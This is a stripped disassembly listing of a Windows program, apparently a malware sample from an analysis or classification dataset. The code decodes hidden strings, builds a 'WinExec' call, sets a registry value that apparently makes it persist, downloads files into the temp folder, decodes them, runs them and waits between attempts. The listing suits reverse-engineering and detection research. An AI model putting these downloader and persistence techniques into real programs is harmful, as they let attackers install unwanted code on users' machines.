sub_401000
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
mov eax edi
and eax 0x80000003
jns r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
push rw-data
push esi
xor ebx ebx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push 0x3d
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ edi + edi * 2 ]
cdq
and edx 0x3
add eax edx
mov ecx eax
mov eax [ esp + 0x18 ]
sar ecx 0x2
sub ecx ebx
cmp eax ecx
jge r-xdata
mov ebx 0x1
sub edi ebx
push ebp
mov [ esp + 0x14 ] edi
push eax
xor edi edi
xor ebx ebx
call ??2@YAPAXI@Z
mov ebp eax
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax 0x4
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov ecx eax
shr ecx 0x2
mov [ esp + 0x1c ] ecx
neg ecx
lea edx [ eax + ecx * 4 ]
mov [ esp + 0x14 ] edx
cmp eax 0x2
jne r-xdata
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ edi + esi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x1 ]
sub eax rw-data
sar eax 0x2
or cl al
add esp 0x18
mov [ ebx + ebp + 0x1 ] cl
add ebx 0x2
jmp r-xdata
movsx eax [ esi + edi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ esi + edi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ esi + edi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov dl [ ebx + ebp + 0x1 ]
sub eax rw-data
mov ecx eax
sar ecx 0x2
or dl cl
shl al 0x6
mov [ ebx + ebp + 0x1 ] dl
mov [ ebx + ebp + 0x2 ] al
movsx edx [ esi + edi + 0x3 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x2 ]
sub eax rw-data
or cl al
mov eax [ esp + 0x3c ]
mov [ ebx + ebp + 0x2 ] cl
add esp 0x20
add edi 0x4
add ebx 0x3
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov ecx ebx
mov eax ecx
mov esi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov cl [ ebx + ebp ]
sub eax rw-data
sar eax 0x4
or cl al
add esp 0x10
mov [ ebx + ebp ] cl
inc ebx
sub_401240
sub esp 0x10c
mov al [ rw-data ]
push ebp
push edi
mov [ esp + 0x10 ] al
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x11 ]
push 0x2f
[ edi ]
mov ecx [ esp + 0x11c ]
mov [ esp + 0xc ] 0x57
stosw [ edi ]
stosb [ edi ]
mov edi [ strrchr@IAT ]
push ecx
mov [ esp + 0x11 ] 0x69
mov [ esp + 0x12 ] 0x6e
mov [ esp + 0x13 ] 0x45
mov [ esp + 0x14 ] 0x78
mov [ esp + 0x15 ] 0x65
mov [ esp + 0x16 ] 0x63
mov [ esp + 0x17 ] 0x0
call edi
add esp 0x8
test eax eax
jne r-xdata
mov ebp [ esp + 0x120 ]
push esi
test ebp ebp
je r-xdata
pop edi
pop ebp
add esp 0x10c
retn
mov edi [ esp + 0x120 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov esi [ esp + 0x120 ]
push 0x2e
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
test ebp ebp
je r-xdata
pop edi
pop ebp
add esp 0x10c
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
push 0x2e
push esi
call edi
add esp 0x8
sub eax esi
jmp r-xdata
pop edi
mov eax 0x1
pop ebp
add esp 0x10c
retn
push rw-data
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
call eax
cmp eax 0x1f
ja r-xdata
mov [ esp + ecx + 0x14 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x14 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx eax
xor ecx ecx
test eax eax
jle r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x10c
retn
mov edx [ esp + 0x11c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call sub_4013d0
add esp 0x8
test eax eax
pop esi
jne r-xdata
sub_4013d0
sub esp 0x614
push ebx
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x120 ]
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0x0
and ecx 0x3
push 0x0
[ edi ] [ esi ]
lea ecx [ esp + 0x130 ]
push ecx
call [ InternetOpenA@IAT ]
mov ebp eax
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov edx [ esp + 0x628 ]
push 0x0
push 0x80000000
push 0x0
push 0x0
push edx
push ebp
call [ InternetOpenUrlA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x614
retn
push 0x0
mov [ esp + 0x14 ] 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
push 0x9
call [ malloc@IAT ]
xor ecx ecx
mov [ esp + 0x1c ] eax
mov [ eax ] ecx
lea edx [ esp + 0x1c ]
mov [ eax + 0x4 ] ecx
push ecx
push 0x9
push 0x8
push edx
mov [ eax + 0x8 ] cl
call sub_401f80
add esp 0x1c
lea eax [ esp + 0x1c ]
push eax
push 0x104
call [ GetTempPathA@IAT ]
mov edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push ebp
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x614
retn
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x224 ]
push ecx
push 0x400
push edx
mov edi eax
push ebx
call edi
test eax eax
je r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebx
call esi
push ebp
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x614
retn
push esi
call [ fclose@IAT ]
mov esi [ InternetCloseHandle@IAT ]
add esp 0x4
push ebx
call esi
push ebp
call esi
mov eax [ esp + 0x62c ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
call sub_401610
add esp 0x8
lea edx [ esp + 0x1c ]
mov esi eax
push edx
call [ DeleteFileA@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ebp [ fwrite@IAT ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x614
retn
push eax
call [ free@IAT ]
add esp 0x4
mov ebp [ esp + 0x18 ]
push esi
push eax
lea eax [ esp + 0x22c ]
push 0x1
push eax
call ebp
push esi
call [ fflush@IAT ]
add esp 0x14
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x224 ]
push ecx
push 0x400
push edx
push ebx
call edi
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
sub_401610
sub esp 0x40c
mov eax [ esp + 0x410 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x19 ] 0x3
mov [ esp + 0x1a ] 0xb7
mov [ esp + 0x1b ] 0xb9
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov ebx [ fseek@IAT ]
push 0x2
push 0xfffffffa
push edi
call ebx
push edi
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call [ fread@IAT ]
mov esi [ esp + 0x30 ]
mov edx [ esp + 0x31 ]
mov eax [ esp + 0x32 ]
and esi 0xff
mov ecx [ esp + 0x33 ]
and edx 0xff
shl esi 0x8
add esi edx
and eax 0xff
shl esi 0x8
add esi eax
push 0x2
shl esi 0x8
and ecx 0xff
push 0x0
push edi
add esi ecx
call ebx
push edi
call [ ftell@IAT ]
mov edx 0xfffffff6
push 0x0
mov ebp eax
sub edx esi
push esi
push edi
add ebp edx
call ebx
push edi
push 0x4
lea eax [ esp + 0x5c ]
push 0x1
push eax
call [ fread@IAT ]
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x58 ]
add esp 0x48
mov eax [ edx ]
mov edx [ ecx ]
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
mov ecx [ esp + 0x424 ]
push rw-data
push ecx
xor ebx ebx
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
push edi
push 0x400
lea edx [ esp + 0x24 ]
push 0x1
push edx
call [ fread@IAT ]
add ebx eax
add esp 0x10
cmp ebx ebp
jg r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
sub eax ebx
xor ecx ecx
add eax ebp
test eax eax
jle r-xdata
xor ecx ecx
test eax eax
jle r-xdata
push esi
push eax
lea eax [ esp + 0x24 ]
push 0x1
push eax
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
push esi
mov esi [ fclose@IAT ]
call esi
push edi
call esi
add esp 0x1c
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40c
retn
mov dl [ esp + ecx + 0x1c ]
inc ecx
not dl
mov [ esp + ecx + 0x1b ] dl
cmp ecx eax
jl r-xdata
push esi
push eax
lea eax [ esp + 0x24 ]
push 0x1
push eax
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
add esp 0x14
jmp r-xdata
mov dl [ esp + ecx + 0x1c ]
inc ecx
not dl
mov [ esp + ecx + 0x1b ] dl
cmp ecx eax
jl r-xdata
sub_4017d0
sub esp 0x9a4
push ebx
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x71c ]
[ edi ]
not ecx
sub edi ecx
push 0x104
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x1c ]
push 0x5c
push edx
call [ strrchr@IAT ]
inc eax
or ecx 0xffffffff
mov edi eax
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x22c ]
mov eax ecx
mov esi edi
mov edi edx
push 0x2e
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x230 ]
push ecx
call [ strchr@IAT ]
add esp 0x10
lea edx [ esp + 0x18 ]
mov [ eax ] 0x0
lea eax [ esp + 0x71c ]
push edx
push 0xf003f
push 0x0
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x224 ]
[ edi ]
not ecx
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push 0x1
push eax
mov eax [ esp + 0x28 ]
push edx
push eax
call [ RegSetValueExA@IAT ]
mov esi [ RegCloseKey@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call esi
push 0x80000001
call esi
lea edx [ esp + 0x1c ]
push edx
call [ LoadLibraryA@IAT ]
mov ebx [ LoadStringA@IAT ]
mov esi eax
lea eax [ esp + 0x588 ]
push 0x191
push eax
push 0x1
push esi
call ebx
lea ecx [ esp + 0x458 ]
push 0x12d
push ecx
lea edi [ esp + 0x590 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x590 ]
push ecx
push edx
call sub_401ae0
add esp 0x10
mov [ esp + eax + 0x458 ] 0x0
lea eax [ esp + 0x820 ]
push 0x12d
push eax
push 0x2
push esi
call ebx
lea ecx [ esp + 0x328 ]
push 0x12d
push ecx
lea edi [ esp + 0x828 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x828 ]
push ecx
push edx
call sub_401ae0
add esp 0x10
mov [ esp + eax + 0x328 ] 0x0
push esi
call [ FreeLibrary@IAT ]
xor ebx ebx
push 0x208
mov [ esp + 0x14 ] ebx
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
mov [ esp + 0x14 ] ebp
inc ebx
mov [ esp + 0x10 ] ecx
cmp ebx 0x3
jl r-xdata
dec eax
je r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x5b8d80
call [ Sleep@IAT ]
jmp r-xdata
mov [ esp + 0x10 ] ecx
lea ecx [ ebp + 0x104 ]
push ecx
xor ebx ebx
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x5
push edx
call [ Sleep@IAT ]
jmp r-xdata
dec eax
jne r-xdata
mov ecx 0x82
xor eax eax
mov edi ebp
[ edi ]
lea eax [ esp + 0x328 ]
lea ecx [ esp + 0x458 ]
push eax
push ebp
push ecx
call sub_401b50
xor ecx ecx
add esp 0xc
sub eax ecx
je r-xdata
lea edx [ esp + 0x120 ]
xor ebx ebx
push edx
push 0x104
call [ GetTempPathA@IAT ]
add ebp 0x104
push 0x2f
push ebp
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x128 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x128 ]
and ecx 0x3
push 0x1
push eax
push ebp
[ edi ] [ esi ]
call sub_401240
add esp 0x14
test eax eax
jne r-xdata
push 0x57e40
mov [ esp + 0x14 ] 0x0
call [ Sleep@IAT ]
mov ebp [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x3
mov [ esp + 0x10 ] eax
jl r-xdata
push 0x75300
call [ Sleep@IAT ]
mov ebp [ esp + 0x14 ]
jmp r-xdata
push 0x5265c0
call [ Sleep@IAT ]
mov ebp [ esp + 0x14 ]
jmp r-xdata
sub_401ae0
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax + 0x1 ]
push ebx
call [ malloc@IAT ]
mov ecx ebx
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x1c ]
push eax
call sub_402030
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
push ecx
push ebx
push esi
call sub_401000
mov edi eax
push esi
mov [ edi + ebx ] 0x0
call [ free@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_401b50
sub esp 0x744
push ebx
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor ebp ebp
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x250 ]
mov eax ecx
mov esi edi
mov edi edx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
push ebp
[ edi ] [ esi ]
lea ecx [ esp + 0x25c ]
push ebp
push ecx
mov [ esp + 0x24 ] ebp
call [ InternetOpenA@IAT ]
mov ebx eax
cmp ebx ebp
jne r-xdata
mov edi [ esp + 0x758 ]
push ebp
push 0x80000000
push ebp
push ebp
push edi
push ebx
call [ InternetOpenUrlA@IAT ]
cmp eax ebp
mov [ esp + 0x14 ] eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x744
retn
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov [ rw-data ] eax
call [ FreeLibrary@IAT ]
lea edx [ esp + 0x1c ]
push edx
push 0x104
call [ GetTempPathA@IAT ]
push 0x2f
push edi
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x24 ]
and ecx 0x3
push rw-data
[ edi ] [ esi ]
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x10
cmp esi ebp
jne r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x744
retn
mov edi [ fwrite@IAT ]
mov [ esp + 0x18 ] ebp
mov ebp [ fflush@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x744
retn
mov edx [ esp + 0x14 ]
mov edi [ InternetCloseHandle@IAT ]
push edx
call edi
push ebx
call edi
mov ebp [ fclose@IAT ]
push esi
call ebp
push esi
call ebp
mov eax [ esp + 0x1c ]
add esp 0x8
push eax
call edi
push ebx
call edi
lea ecx [ esp + 0x120 ]
push 0x12d
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_401de0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call [ DeleteFileA@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x744
retn
mov esi [ strchr@IAT ]
lea eax [ esp + 0x120 ]
push 0x3a
push eax
call esi
add esp 0x8
test eax eax
je r-xdata
push esi
push eax
lea ecx [ esp + 0x35c ]
push 0x1
push ecx
call edi
push esi
call ebp
add esp 0x14
jmp r-xdata
lea ecx [ esp + 0x120 ]
push 0x3a
push ecx
call esi
mov ebx [ esp + 0x764 ]
lea edx [ esp + 0x128 ]
sub eax edx
push eax
lea eax [ esp + 0x12c ]
push eax
push ebx
call [ strncpy@IAT ]
lea ecx [ esp + 0x134 ]
push 0x3a
push ecx
call esi
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ ebx + 0x104 ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ _stricmp@IAT ]
call esi
add esp 0x24
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x358 ]
push 0x400
push edx
push eax
call [ rw-data ]
test eax eax
je r-xdata
push rw-data
push ebx
call esi
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov [ esp + 0x10 ] 0x2
sub_401de0
sub esp 0x1a0
mov eax [ esp + 0x1a4 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x19 ] 0x2
mov [ esp + 0x1a ] 0xb7
mov [ esp + 0x1b ] 0xbc
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov edi [ fseek@IAT ]
push 0x2
push 0xfffffffa
push ebx
call edi
push ebx
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call [ fread@IAT ]
mov esi [ esp + 0x30 ]
mov edx [ esp + 0x31 ]
mov eax [ esp + 0x32 ]
and esi 0xff
mov ecx [ esp + 0x33 ]
and edx 0xff
shl esi 0x8
add esi edx
and eax 0xff
shl esi 0x8
add esi eax
push 0x2
shl esi 0x8
and ecx 0xff
push 0x0
push ebx
add esi ecx
call edi
push ebx
call [ ftell@IAT ]
mov edx 0xfffffff6
push 0x0
mov ebp eax
sub edx esi
push esi
push ebx
add ebp edx
call edi
push ebx
push 0x4
lea eax [ esp + 0x5c ]
push 0x1
push eax
call [ fread@IAT ]
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x58 ]
add esp 0x48
mov eax [ edx ]
mov edx [ ecx ]
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov ecx 0x64
xor eax eax
lea edi [ esp + 0x1c ]
cmp ebp 0x190
[ edi ]
stosb [ edi ]
push ebx
jbe r-xdata
push ebx
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
push ebp
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call [ fread@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x14
xor eax eax
test ebp ebp
jle r-xdata
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov eax [ esp + 0x1bc ]
mov esi [ esp + 0x1b8 ]
push eax
push esi
lea ecx [ esp + 0x24 ]
push ebp
push ecx
call sub_401ae0
add esp 0x10
mov [ eax + esi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn
mov dl [ esp + eax + 0x1c ]
inc eax
not dl
mov [ esp + eax + 0x1b ] dl
cmp eax ebp
jl r-xdata
sub_401f80
mov edx [ esp + 0xc ]
cmp edx 0x104
mov ecx edx
jle r-xdata
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
test ebp ebp
push edi
je r-xdata
xor al al
retn
mov ebx [ esp + 0x14 ]
mov esi ecx
xor eax eax
push edx
mov edi [ ebx ]
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x1c ]
push eax
call sub_401f60
mov edi eax
add esp 0x8
xor esi esi
test edi edi
jle r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea ecx [ ecx + edx + 0x1 ]
test ebp ebp
je r-xdata
push 0x7a
push 0x61
call sub_401f60
mov ecx [ ebx ]
add esp 0x8
mov [ ecx + esi ] al
inc esi
cmp esi edi
jl r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
mov edx [ ebx ]
mov esi [ strncat@IAT ]
push 0x1
push rw-data
push edx
call esi
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebx ]
not ecx
dec ecx
push ecx
push ebp
push eax
call esi
add esp 0x18
sub_402030
push ecx
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x14 ]
not ecx
dec ecx
dec eax
cmp eax ecx
jge r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
push esi
dec ecx
xor esi esi
mov [ esp + 0xc ] ecx
test ecx ecx
jle r-xdata
xor eax eax
pop edi
pop ecx
retn
mov eax [ esp + 0x18 ]
mov [ esi + eax ] 0x0
mov eax esi
pop esi
pop ebp
pop edi
pop ecx
retn
mov ecx [ esp + 0x18 ]
mov eax edx
sub eax ecx
push ebx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea ebx [ esi + ecx ]
movsx edx [ eax + ebx ]
push edx
push rw-data
call [ strchr@IAT ]
mov edi eax
mov eax esi
cdq
idiv [ esp + 0x28 ]
sub edi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call [ strchr@IAT ]
lea ecx [ edi + ebp + rw-data ]
add esp 0x10
sub ecx eax
mov eax ecx
cdq
idiv ebp
mov eax [ esp + 0x10 ]
inc esi
cmp esi eax
mov dl [ edx + rw-data ]
mov [ ebx ] dl
jl r-xdata
mov eax [ esp + 0x18 ]
pop ebx
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40229b
cmp [ rw-data ] ebx
jne r-xdata
call sub_402286
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402298
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4017d0
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402286
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402298
xor eax eax
retn
sub_40229b
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
